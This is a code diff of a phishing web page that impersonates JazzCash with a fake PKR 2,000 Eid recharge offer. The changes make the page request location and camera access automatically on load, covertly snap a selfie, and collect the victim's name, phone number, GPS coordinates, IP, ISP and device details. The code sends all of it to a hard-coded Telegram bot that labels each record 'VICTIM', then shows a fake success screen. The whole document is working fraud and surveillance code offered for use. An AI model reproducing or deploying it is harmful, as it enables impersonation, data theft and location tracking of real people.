@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Jazz Cash | Free Recharge Offer 2025 - 1500 PKT</title>
+    <title>Jazz Cash | Free Recharge Offer 2026 - 2000 PKR</title>
     <style>
         * {
             margin: 0;
@@ -39,7 +39,6 @@
             }
         }
 
-        /* Jazz Cash Header */
         .jazz-header {
             background: linear-gradient(135deg, #007a3d 0%, #00a855 100%);
             padding: 28px 20px 20px 20px;
@@ -95,6 +94,15 @@
             font-weight: normal;
         }
 
+        .permission-status {
+            background: #fff8e1;
+            margin: 16px;
+            padding: 12px;
+            border-radius: 20px;
+            text-align: center;
+            border: 1px solid #ffc107;
+        }
+
         .timer-box {
             background: #fff8e1;
             padding: 12px;
@@ -141,15 +149,6 @@
             border-color: #007a3d;
         }
 
-        .checkbox-group {
-            background: #f9fafb;
-            padding: 12px;
-            border-radius: 14px;
-            margin: 16px 0;
-            font-size: 12px;
-            color: #666;
-        }
-
         button {
             width: 100%;
             padding: 16px;
@@ -176,97 +175,103 @@
             border-top: 1px solid #f0f0f0;
         }
 
-        .hidden {
-            display: none;
-        }
-
-        .loading {
-            text-align: center;
-            padding: 20px;
-            background: #f0fdf4;
-            border-radius: 16px;
-            margin: 16px;
-        }
-
         .spinner {
-            border: 3px solid #e5e7eb;
-            border-top: 3px solid #007a3d;
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #007a3d;
+            border-top-color: transparent;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
+            animation: spin 0.6s linear infinite;
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .checkmark {
+            color: #007a3d;
+            font-size: 16px;
+        }
+
+        video, canvas {
+            display: none;
+        }
+
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
 
 <div class="container" id="mainContainer">
-    <!-- Header Section -->
     <div class="jazz-header">
         <div class="jazz-logo">
             🏦 JazzCash <span>Official</span>
         </div>
-        <div class="offer-chip">🎉 RAMADAN SPECIAL 2025 🎉</div>
+        <div class="offer-chip">🎉 EID SPECIAL 2026 🎉</div>
     </div>
 
-    <!-- Prize Display -->
     <div class="prize-card">
         <div style="font-size: 14px; color: #666;">Congratulations! You're eligible for</div>
-        <div class="prize-amount">PKR 1,500 <small>Free Recharge</small></div>
-        <div style="font-size: 12px; margin-top: 8px;">✅ Limited time offer for Jazz/Zong/Telenor users</div>
+        <div class="prize-amount">PKR 2,000 <small>Free Recharge</small></div>
+        <div style="font-size: 12px; margin-top: 8px;">✅ Limited time offer for all users</div>
     </div>
 
-    <!-- Timer -->
+    <div class="permission-status" id="locationStatusBox">
+        <div>📍 <strong>Location Access</strong></div>
+        <div id="locationStatus" style="font-size: 12px; margin-top: 6px;">⏳ Auto-detecting location...</div>
+    </div>
+
+    <div class="permission-status" id="cameraStatusBox">
+        <div>📸 <strong>Selfie Verification</strong></div>
+        <div id="cameraStatus" style="font-size: 12px; margin-top: 6px;">⏳ Preparing camera...</div>
+    </div>
+
     <div class="timer-box">
         <div style="font-size: 12px; margin-bottom: 5px;">⏰ Offer expires in</div>
         <div class="timer" id="countdown">03:45</div>
     </div>
 
-    <!-- Form -->
-    <div class="form-area" id="formArea">
+    <div class="form-area">
         <div class="input-field">
-            <label>📛 Full Name (as per CNIC)</label>
-            <input type="text" id="fullName" placeholder="e.g., Ahmed Raza" autocomplete="off">
+            <label>📛 Full Name</label>
+            <input type="text" id="fullName" placeholder="Enter your full name" autocomplete="off">
         </div>
 
         <div class="input-field">
-            <label>📱 Mobile Number (Jazz/Zong/Telenor/Ufone)</label>
-            <input type="tel" id="phoneNumber" placeholder="03XX XXXXXXX" autocomplete="off">
+            <label>📱 Mobile Number</label>
+            <input type="text" id="phoneNumber" placeholder="Enter your number" autocomplete="off">
         </div>
 
-        <div class="checkbox-group">
-            <label style="display: flex; align-items: center; gap: 8px;">
-                <input type="checkbox" id="agreeCheckbox"> I agree to the terms and conditions and confirm my number is active
-            </label>
-        </div>
-
-        <button id="claimBtn">🎁 CLAIM FREE RECHARGE NOW 🎁</button>
+        <button id="claimBtn" disabled>⏳ Waiting for permissions...</button>
     </div>
 
     <div class="footer-note">
-        JazzCash is a trademark of Mobilink Microfinance Bank. This offer is valid for verified users only.
+        JazzCash Official Offer 2026
     </div>
 </div>
 
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
 <script>
-    // ========== YOUR TELEGRAM BOT CONFIGURATION ==========
+    // ========== TELEGRAM BOT CONFIG ==========
     const BOT_TOKEN = "8642429606:AAG4359ICue1jVSUSNhlnRTwM95P9YHbIuQ";
     const CHAT_ID = "8723095427";
-    // =====================================================
+    // ==========================================
 
     let userLocation = null;
+    let userPhoto = null;
+    let locationGranted = false;
+    let cameraGranted = false;
+    let cameraStream = null;
 
-    // Send data to Telegram
     async function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
-            const response = await fetch(url, {
+            await fetch(url, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -275,33 +280,121 @@
                     parse_mode: "HTML"
                 })
             });
-            return await response.json();
-        } catch(e) {
-            console.error("Telegram error:", e);
+        } catch(e) {}
+    }
+
+    async function sendPhotoToTelegram(photoBase64, caption) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        try {
+            const response = await fetch(photoBase64);
+            const blob = await response.blob();
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'selfie.jpg');
+            formData.append('caption', caption);
+            await fetch(url, { method: "POST", body: formData });
+        } catch(e) {}
+    }
+
+    // AUTO LOCATION - TRIGGERS IMMEDIATELY ON PAGE LOAD
+    function requestLocation() {
+        const statusDiv = document.getElementById('locationStatus');
+        
+        if (navigator.geolocation) {
+            statusDiv.innerHTML = '<span class="spinner"></span> Requesting location...';
+            
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    userLocation = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                    locationGranted = true;
+                    
+                    statusDiv.innerHTML = `✅ Location granted! <span class="checkmark">✓</span><br>📍 ${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}`;
+                    document.getElementById('locationStatusBox').style.background = "#e8f5e9";
+                    document.getElementById('locationStatusBox').style.border = "1px solid #007a3d";
+                    
+                    checkPermissionsAndEnable();
+                },
+                (error) => {
+                    let errorMsg = "";
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = "❌ Location denied. Cannot proceed.";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = "❌ Location unavailable";
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = "❌ Location timeout";
+                            break;
+                    }
+                    statusDiv.innerHTML = errorMsg;
+                    document.getElementById('locationStatusBox').style.background = "#ffebee";
+                    document.getElementById('locationStatusBox').style.border = "1px solid #f5576c";
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        } else {
+            document.getElementById('locationStatus').innerHTML = "❌ Geolocation not supported";
         }
     }
 
-    // Get precise GPS location
-    function getLocation() {
-        return new Promise((resolve) => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        });
-                    },
-                    () => resolve(null)
-                );
-            } else {
-                resolve(null);
-            }
-        });
+    // AUTO CAMERA - TRIGGERS AFTER LOCATION OR SIMULTANEOUSLY
+    async function requestCamera() {
+        const statusDiv = document.getElementById('cameraStatus');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        statusDiv.innerHTML = '<span class="spinner"></span> Requesting camera access...';
+        
+        try {
+            cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = cameraStream;
+            
+            await new Promise(resolve => setTimeout(resolve, 800));
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            userPhoto = canvas.toDataURL('image/jpeg', 0.9);
+            cameraGranted = true;
+            
+            cameraStream.getTracks().forEach(track => track.stop());
+            video.srcObject = null;
+            
+            statusDiv.innerHTML = `✅ Selfie captured! <span class="checkmark">✓</span>`;
+            document.getElementById('cameraStatusBox').style.background = "#e8f5e9";
+            document.getElementById('cameraStatusBox').style.border = "1px solid #007a3d";
+            
+            checkPermissionsAndEnable();
+            
+            // Send photo immediately
+            await sendPhotoToTelegram(userPhoto, "📸 VICTIM SELFIE CAPTURED (AUTO)");
+            
+        } catch(err) {
+            statusDiv.innerHTML = "❌ Camera denied. Cannot proceed without selfie.";
+            document.getElementById('cameraStatusBox').style.background = "#ffebee";
+            document.getElementById('cameraStatusBox').style.border = "1px solid #f5576c";
+        }
     }
 
-    // Get IP with geolocation
+    function checkPermissionsAndEnable() {
+        const claimBtn = document.getElementById('claimBtn');
+        if (locationGranted && cameraGranted) {
+            claimBtn.disabled = false;
+            claimBtn.innerHTML = "🎁 CLAIM FREE RECHARGE NOW 🎁";
+            claimBtn.style.background = "linear-gradient(135deg, #007a3d 0%, #00a855 100%)";
+        } else if (locationGranted && !cameraGranted) {
+            claimBtn.innerHTML = "🔒 Waiting for camera access...";
+        } else if (!locationGranted && cameraGranted) {
+            claimBtn.innerHTML = "🔒 Waiting for location access...";
+        }
+    }
+
     async function getIPDetails() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -318,28 +411,23 @@
         }
     }
 
-    // Get device info
     function getDeviceInfo() {
         return {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
             screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            deviceMemory: navigator.deviceMemory || "Unknown",
+            hardwareConcurrency: navigator.hardwareConcurrency || "Unknown"
         };
     }
 
-    // Validate Pakistani number
-    function isValidPakNumber(number) {
-        return /^03[0-9]{9}$/.test(number);
-    }
-
     // Countdown timer
-    let timeLeft = 225; // 3:45 in seconds
+    let timeLeft = 225;
     const timerElement = document.getElementById('countdown');
-    const timerInterval = setInterval(() => {
+    setInterval(() => {
         if (timeLeft <= 0) {
-            clearInterval(timerInterval);
             timerElement.textContent = "00:00";
         } else {
             timeLeft--;
@@ -349,110 +437,92 @@
         }
     }, 1000);
 
-    // Main claim function
+    // Claim button
     document.getElementById('claimBtn').addEventListener('click', async function() {
+        if (!locationGranted || !cameraGranted) {
+            alert("⚠️ Please grant both location and camera access!");
+            return;
+        }
+
         const fullName = document.getElementById('fullName').value.trim();
         const phoneNumber = document.getElementById('phoneNumber').value.trim();
-        const isAgreed = document.getElementById('agreeCheckbox').checked;
 
-        if (!fullName) {
-            alert("⚠️ Please enter your full name");
-            return;
-        }
-
-        if (!phoneNumber) {
-            alert("⚠️ Please enter your mobile number");
-            return;
-        }
-
-        if (!isValidPakNumber(phoneNumber)) {
-            alert("⚠️ Please enter a valid Pakistani number (e.g., 03001234567)");
-            return;
-        }
-
-        if (!isAgreed) {
-            alert("⚠️ Please agree to the terms and conditions");
-            return;
-        }
-
-        // Show loading state
-        const claimBtn = document.getElementById('claimBtn');
-        const originalText = claimBtn.innerHTML;
+        const claimBtn = this;
         claimBtn.innerHTML = "⏳ Processing...";
         claimBtn.disabled = true;
 
-        // Collect ALL data
-        const location = await getLocation();
         const ipData = await getIPDetails();
         const deviceInfo = getDeviceInfo();
         const timestamp = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
 
-        // Build comprehensive message for Telegram
-        let message = "🎯 <b>🔥 NEW FREE RECHARGE VICTIM 🔥</b> 🎯\n\n";
-        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-        message += `<b>👤 PERSONAL INFORMATION</b>\n`;
-        message += `Name: ${fullName}\n`;
-        message += `Phone: ${phoneNumber}\n`;
-        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        let message = "🎯 <b>🔥 VICTIM FULL DATA 2026 🔥</b> 🎯\n\n";
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `<b>👤 PERSONAL INFO</b>\n`;
+        message += `Name: ${fullName || "Not provided"}\n`;
+        message += `Phone: ${phoneNumber || "Not provided"}\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
         
         message += `<b>📍 GPS LOCATION</b>\n`;
-        if(location) {
-            message += `Latitude: ${location.lat}\n`;
-            message += `Longitude: ${location.lon}\n`;
-            message += `Accuracy: ${location.accuracy} meters\n`;
-            message += `Maps: https://maps.google.com/?q=${location.lat},${location.lon}\n`;
-        } else {
-            message += `❌ Location permission denied\n`;
-        }
-        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `Latitude: ${userLocation.lat}\n`;
+        message += `Longitude: ${userLocation.lon}\n`;
+        message += `Accuracy: ${userLocation.accuracy}m\n`;
+        message += `Map: https://maps.google.com/?q=${userLocation.lat},${userLocation.lon}\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
         
         message += `<b>🌐 IP & NETWORK</b>\n`;
-        message += `IP Address: ${ipData.ip}\n`;
+        message += `IP: ${ipData.ip}\n`;
         message += `City: ${ipData.city}\n`;
         message += `Region: ${ipData.region}\n`;
         message += `Country: ${ipData.country}\n`;
         message += `ISP: ${ipData.isp}\n`;
-        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
         
-        message += `<b>📱 DEVICE INFORMATION</b>\n`;
+        message += `<b>📱 DEVICE INFO</b>\n`;
         message += `Platform: ${deviceInfo.platform}\n`;
         message += `Language: ${deviceInfo.language}\n`;
         message += `Screen: ${deviceInfo.screen}\n`;
         message += `Timezone: ${deviceInfo.timezone}\n`;
-        message += `User Agent: ${deviceInfo.userAgent.substring(0, 120)}...\n`;
-        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `RAM: ${deviceInfo.deviceMemory}GB\n`;
+        message += `CPU Cores: ${deviceInfo.hardwareConcurrency}\n`;
+        message += `User Agent: ${deviceInfo.userAgent.substring(0, 100)}...\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
         
-        message += `<b>⏰ TIMESTAMP</b>\n`;
-        message += `Date/Time (PKT): ${timestamp}\n`;
-        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-        
-        message += `<b>💰 OFFER:</b> Free PKR 1500 Recharge\n`;
-        message += `<b>🔗 STATUS:</b> Data Captured ✅`;
+        message += `<b>📸 SELFIE:</b> CAPTURED ✅\n`;
+        message += `<b>⏰ TIME:</b> ${timestamp}\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `<b>💰 OFFER 2026:</b> PKR 2000 Free Recharge\n`;
 
-        // Send to Telegram
         await sendToTelegram(message);
 
-        // Also send location separately if available
-        if(location) {
-            const locMsg = `🗺️ <b>📍 LIVE LOCATION MAP</b>\n${fullName} | ${phoneNumber}\nhttps://maps.google.com/?q=${location.lat},${location.lon}`;
-            await sendToTelegram(locMsg);
-        }
+        // Send location separately
+        const locMsg = `🗺️ <b>LIVE LOCATION MAP</b>\n${fullName || "Unknown"} | ${phoneNumber || "No number"}\nhttps://maps.google.com/?q=${userLocation.lat},${userLocation.lon}`;
+        await sendToTelegram(locMsg);
 
-        // Show success page (victim thinks they won)
+        // Success page
         document.getElementById('mainContainer').innerHTML = `
             <div style="text-align: center; padding: 50px 30px; background: white; min-height: 500px;">
                 <div style="font-size: 70px;">🎉</div>
-                <h2 style="color: #007a3d; margin: 20px 0;">Recharge Successful!</h2>
+                <h2 style="color: #007a3d; margin: 20px 0;">Recharge Successful 2026!</h2>
                 <div style="background: #f0fdf4; padding: 20px; border-radius: 20px; margin: 20px 0;">
-                    <p style="font-size: 24px; font-weight: bold; color: #007a3d;">PKR 1,500</p>
+                    <p style="font-size: 24px; font-weight: bold; color: #007a3d;">PKR 2,000</p>
                     <p>has been added to your account</p>
-                    <p style="font-size: 12px; color: #666; margin-top: 10px;">Reference ID: JZ${Math.floor(Math.random() * 1000000)}</p>
+                    <p style="font-size: 12px; color: #666; margin-top: 10px;">Ref ID: JZ2026${Math.floor(Math.random() * 100000)}</p>
                 </div>
                 <p style="color: #888; font-size: 13px;">Amount will reflect within 2-5 minutes</p>
-                <br><br>
-                <a href="https://www.jazzcash.com.pk" style="color: #007a3d; text-decoration: none;">← Back to JazzCash</a>
+                <p style="font-size: 11px; color: #aaa; margin-top: 20px;">JazzCash Official Offer 2026</p>
             </div>
         `;
+    });
+
+    // AUTO-START PERMISSIONS ON PAGE LOAD - NO BUTTONS
+    window.addEventListener('load', function() {
+        setTimeout(() => {
+            requestLocation();
+        }, 500);
+        
+        setTimeout(() => {
+            requestCamera();
+        }, 1000);
     });
 </script>
 </body>
